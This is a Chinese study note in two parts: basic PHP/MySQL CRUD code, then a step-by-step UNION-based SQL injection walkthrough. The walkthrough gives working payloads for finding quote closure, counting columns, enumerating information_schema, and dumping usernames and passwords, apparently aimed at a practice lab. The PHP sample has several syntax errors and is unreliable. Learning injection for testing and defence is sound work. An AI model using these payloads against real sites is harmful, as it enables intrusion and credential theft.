#### 1、sql标准流程
```php
<?php
$servername = "localhost";
$username = "root";
$password = "root"
$dbname = "hh"	// 库名

$con = new mysqli($servername, $username, $password, $dbname);

if($con->connect_error){
    die("...");
}

//查
$sql = "SELECT * FROM table1 WHERE id = 2";

// 执行sql语句并返回到result变量中
$result = $con->query($sql);

if($result->num_rows > 0){
    // 穷举
    while($row = $result->fetch_assoc()){
        echo $row['username'].'.............'.$row['password'].<br/>
    }
}

// 增
$sql = "INSERT INTO tables (id, username, password) VALUES
	(21, 'test1', 'tttt')"

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

//改
$sql = "UPDATE table1 SET password = '1111'
	WHERE username = 'xiaohong'";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 删
$sql = "DELETE FROM table1 WHERE id = 21";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 断开数据库
$con->close();
?>
```

#### 2、SQL注入

###### sql小知识：mysql -u[用户名] -p[密码]
###### 查看所有的数据库：show databases;
###### 使用某个数据库名：use [数据库名];
###### 查看此库里有什么表：show tables;
##### 步骤1：推断数据库的语法
```
SELECT * FROM ... where id = '参数' limit 0, 1;
SELECT * FROM ... where id = "参数" limit 0, 1;
```
##### 步骤2：让他报错，显示自己的闭合方式
```
闭合方式的可能
' " ') ") )
```
##### 步骤3：验证目标数据库的参数闭合方式
```
?id = 1' limit 0, 1 --+  // --+的作用为将后面的直接注释掉
```
##### 步骤4：确定有多少列
```
?id = 1' order by 10 limit 0, 1 --+ // 二分法求的多少列
```
##### 步骤5：有哪几列显示在网页上（联合查询，前面的参数必须让数据库报错，显示报错位）
```
?id = -1' union select 1, 2, 3 limit 0, 1 --+
```
##### 步骤6：刺探数据库的内部内容
```
?id = -2' union select 1, database(), 3 limit 0, 1 --+
```
###### 注：information_schema是数据库自带的，相当于数据库的户口本
###### information_schema的tables里面保存着所有数据库的库名和自己的表
###### information_schema的columns保存着所有数据库的库名、列名、表名的所有对应关系
```
?id=-2' union select 1, table_name ,3 from information_schema.tables where table_schema = 'security' limit 0, 1--+

?id=-2' union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema = 'security' --+
```
##### 步骤7：查询表中的列
```
?id=-2' union select 1, group_concat(column_name) ,3 from information_schema.columns where table_schema = 'security' and table_name = 'users'--+
``` 
##### 步骤8：查询内容
```
-2' union select 1, group_concat(username), group_concat(password) from users --+
```
